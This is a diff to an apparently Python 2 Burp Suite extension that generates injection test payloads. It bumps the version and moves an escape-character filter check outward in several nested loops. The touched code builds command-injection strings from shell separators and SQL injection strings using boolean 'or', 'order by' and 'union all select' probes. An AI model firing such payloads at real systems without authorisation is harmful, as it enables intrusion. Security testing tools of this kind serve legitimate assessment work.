@@ -16,7 +16,7 @@ try:
 except:
     print "==== ERROR ====" + "\n\nFailed to load dependencies.\n" +str(sys.exc_info()[1]) +"\n\n==== ERROR ====\n\n"
 
-VERSION = "0.951"
+VERSION = "0.952"
 
 class BurpExtender(IBurpExtender, ITab, IMessageEditorController, IContextMenuFactory):
     
@@ -285,11 +285,11 @@ class BurpExtender(IBurpExtender, ITab, IMessageEditorController, IContextMenuFa
         separators = ["&", "&&", "|", "||", ";"]
         
         for prefix in prefixes:
-            for separator in separators:
-                for escapeChar in escapeChars:
-                    if (prefix[:2].count("\\")) and (escapeChar[:2].count("\\")):
-                        if (prefix[:2].count("\\") != escapeChar[:2].count("\\")):
-                            continue
+            for escapeChar in escapeChars:
+                if (prefix[:2].count("\\")) and (escapeChar[:2].count("\\")):
+                    if (prefix[:2].count("\\") != escapeChar[:2].count("\\")):
+                        continue
+                for separator in separators:
                     listCommandInj.append(prefix + escapeChar + separator + self._txtTargetPath.text + separator + escapeChar + "\n")
                     listCommandInj.append(prefix + escapeChar + separator + self._txtTargetPath.text + escapeChar + "\n")
                     listCommandInj.append(prefix + escapeChar + separator + escapeChar + self._txtTargetPath.text + "\n")
@@ -418,20 +418,20 @@ class BurpExtender(IBurpExtender, ITab, IMessageEditorController, IContextMenuFa
         if self._cbBooleanBased.isSelected():
             for prefix in prefixes:
                 for escapeChar in escapeChars:
+                    if (prefix[:2].count("\\")) and (escapeChar[:2].count("\\")):
+                        if (prefix[:2].count("\\") != escapeChar[:2].count("\\")):
+                            continue
                     for boolExpression in boolExpressions:
                         for suffix in suffixes[1:]:
-                            if (prefix[:2].count("\\")) and (escapeChar[:2].count("\\")):
-                                if (prefix[:2].count("\\") != escapeChar[:2].count("\\")):
-                                    continue
                             listSQLi.append(prefix + escapeChar + " or " + boolExpression + suffix + "\n")
                             if not escapeChar:
                                 listSQLi.append(prefix + " or " + boolExpression + "\n")
             for prefix in prefixes:
                 for escapeChar in escapeChars[1:]:
+                    if (prefix[:2].count("\\")) and (escapeChar[:2].count("\\")):
+                        if (prefix[:2].count("\\") != escapeChar[:2].count("\\")):
+                            continue
                     for suffix in suffixes[1:]:
-                        if (prefix[:2].count("\\")) and (escapeChar[:2].count("\\")):
-                            if (prefix[:2].count("\\") != escapeChar[:2].count("\\")):
-                                continue
                         listSQLi.append(prefix + escapeChar + " or " + escapeChar + "xyz" + escapeChar + "=" + escapeChar + "xyz" + "\n")
                         listSQLi.append(prefix + escapeChar + " or " + escapeChar + "xyz" + escapeChar + "=" + escapeChar + "xyz" + escapeChar + suffix + "\n")
                         listSQLi.append(prefix + " or " + escapeChar + "xyz" + escapeChar + "=" + escapeChar + "xyz" + escapeChar + "\n")
@@ -440,11 +440,11 @@ class BurpExtender(IBurpExtender, ITab, IMessageEditorController, IContextMenuFa
         if self._cbOrderBased.isSelected():
             for prefix in prefixes:
                 for escapeChar in escapeChars:
+                    if (prefix[:2].count("\\")) and (escapeChar[:2].count("\\")):
+                        if (prefix[:2].count("\\") != escapeChar[:2].count("\\")):
+                            continue
                     for suffix in suffixes[1:]:
                         for i in range(int(self._cbOrderDepth.getSelectedItem())):
-                            if (prefix[:2].count("\\")) and (escapeChar[:2].count("\\")):
-                                if (prefix[:2].count("\\") != escapeChar[:2].count("\\")):
-                                    continue
                             listSQLi.append(prefix + escapeChar + " order by " + str(i+1) + suffix + "\n")
                             if not escapeChar:
                                 listSQLi.append(prefix + escapeChar + " order by " + str(i+1) + "\n")
@@ -453,10 +453,10 @@ class BurpExtender(IBurpExtender, ITab, IMessageEditorController, IContextMenuFa
         if self._cbUnionBased.isSelected():
             for prefix in prefixes:
                 for escapeChar in escapeChars:
+                    if (prefix[:2].count("\\")) and (escapeChar[:2].count("\\")):
+                        if (prefix[:2].count("\\") != escapeChar[:2].count("\\")):
+                            continue
                     for suffix in suffixes[1:]:
-                        if (prefix[:2].count("\\")) and (escapeChar[:2].count("\\")):
-                            if (prefix[:2].count("\\") != escapeChar[:2].count("\\")):
-                                continue
                         for union in unions:
                             unionPhrase = " union all select "
                             for i in range(int(self._cbUnionDepth.getSelectedItem())):
@@ -528,10 +528,10 @@ class BurpExtender(IBurpExtender, ITab, IMessageEditorController, IContextMenuFa
 
         for prefix in prefixes:
             for escapeChar in escapeChars:
+                if (prefix[:2].count("\\")) and (escapeChar[:2].count("\\")):
+                    if (prefix[:2].count("\\") != escapeChar[:2].count("\\")):
+                        continue
                 for suffix in suffixes[1:]:
-                    if (prefix[:2].count("\\")) and (escapeChar[:2].count("\\")):
-                        if (prefix[:2].count("\\") != escapeChar[:2].count("\\")):
-                            continue
                     if self._cbOracleBased.isSelected():
                         if self._cbStackedSQL.isSelected():
                             if escapeChar:
